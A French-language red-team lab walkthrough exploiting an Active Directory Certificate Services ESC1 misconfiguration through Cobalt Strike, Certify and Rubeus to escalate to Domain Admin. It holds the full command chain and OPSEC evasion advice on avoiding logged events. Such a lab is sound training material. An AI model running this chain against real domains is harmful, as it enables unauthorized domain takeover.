# ESC1 — Templates Client Authentication mal configurés

>L’objectif de ce lab est d’identifier et d’exploiter une mauvaise configuration **ESC1**.

===

1. Lancer Cobalt Strike et se connecter au team server.
2. Interagir avec le Beacon en **medium integrity**.
3. Énumérer la **Certificate Authority (CA)** et rechercher les templates vulnérables.

```
spawnto x64 %windir%\sysnative\dllhost.exe
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

    > **OPSEC-🟠CAUTION** — `execute-assembly` utilise **fork & run** et lance un processus temporaire (par défaut `rundll32.exe`, sauf personnalisation de `spawnto`). L’**Event 4688** peut être généré si l’audit des créations de processus est actif. Configurer `spawnto` dans le Malleable C2 Profile (par exemple `dllhost.exe`).
    >
    > L’énumération AD CS avec Certify envoie des requêtes LDAP au Domain Controller. L’**Event 1644** peut apparaître si l’audit LDAP détaillé est activé.
    >
    > **Alternative plus discrète :** utiliser `Certutil.exe -TCAInfo` pour une énumération CA de base (LOLBin), ou `ldapsearch` via BOF pour interroger directement `CN=Certificate Templates` sans nouveau processus :

```
ldapsearch (objectClass=pKICertificateTemplate) --dn "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" --attributes name,msPKI-Certificate-Name-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage,nTSecurityDescriptor
```
> Indicateurs ESC1 dans les résultats : `msPKI-Certificate-Name-Flag: 1` (ENROLLEE_SUPPLIES_SUBJECT), `pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2` (Client Authentication), `msPKI-RA-Signature: 0` (sans approbation manuelle). Vérifier dans `nTSecurityDescriptor` que les droits d’enrollment incluent des groupes peu privilégiés (`Domain Users` / `Authenticated Users`).

⚠️ Le résultat attendu est un template nommé *ESC1*.

4. Demander un certificat avec le *UserPrincipalName* de l’Administrator du domaine dans le **Subject Alternative Name (SAN)**.

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```

> **OPSEC-🟠CAUTION** — `execute-assembly` lance de nouveau un processus temporaire. La demande de certificat génère les **Events 4886** (réception) et **4887** (émission) sur la CA. Le certificat est renvoyé par le canal C2 et n’est pas écrit sur disque sauf action explicite.
    >
    > **Alternative plus discrète :** [Certipy](https://github.com/ly4k/Certipy), depuis Linux, peut demander le certificat en RPC/HTTP si la CA est accessible. Dans ce lab, la méthode demandée reste `execute-assembly`.

5. Utiliser **Rubeus** pour demander un **TGT** au nom d’Administrator.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
    ```

    > **OPSEC-🟠CAUTION** — `execute-assembly` utilise un processus temporaire. La requête AS-REQ vers le KDC génère l’**Event 4768**. La pré-authentification par certificat (**PKINIT**) peut être identifiable dans les journaux. L’option `/enctype:aes256` est privilégiée à RC4 dans les notes.
    >
    > L’option `/nowrap` renvoie le ticket en Base64. Le ticket n’est **pas encore injecté** ; l’injection intervient dans la suite du lab.
    >
    > **Alternative :** ajouter `/ptt` à la commande Rubeus pour injecter immédiatement le ticket, sans second appel `execute-assembly`. Un ticket injecté peut néanmoins être visible lors d’une analyse mémoire EDR.

<img src="/images/adcs-esc1-complete.png">  

⚠️ Ce lab illustre l’exploitation d’**ESC1** pour obtenir des privilèges **Domain Admin**.

---

## Vérifier l’accès Domain Admin avec le TGT (OPSEC-🟢SAFE)

Après l’obtention du TGT Administrator, vérifier l’accès Domain Admin sans générer de Lateral Movement inutile.

### Étape 1 — Injecter le ticket dans la session Beacon

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TICKET]
```

> **OPSEC-🟢SAFE** — Le ticket est injecté en mémoire dans la session de logon du Beacon. En dehors du processus `execute-assembly`, aucun autre processus n’est créé. Pas d’écriture sur disque ni de trafic réseau au moment de l’injection.

### Étape 2 — Lister le partage C$ du Domain Controller

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-🟢SAFE** — La commande `ls` utilise le token/ticket actuel du Beacon via SMB et génère un **logon réseau de type 3 (Event 4624)** sur le DC. Aucun service ni processus distant n’est créé. L’accès au partage `C$` confirme les privilèges administrateur sur le DC.


### Alternative — Vérifier le ticket et la session sans trafic réseau

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

> **OPSEC-🟢SAFE** — Liste les tickets de la session de logon courante et permet de contrôler la présence du TGT Administrator avant utilisation, sans connexion à un hôte distant.

<img src="/images/adcs-esc1-command-hisotry.png">  

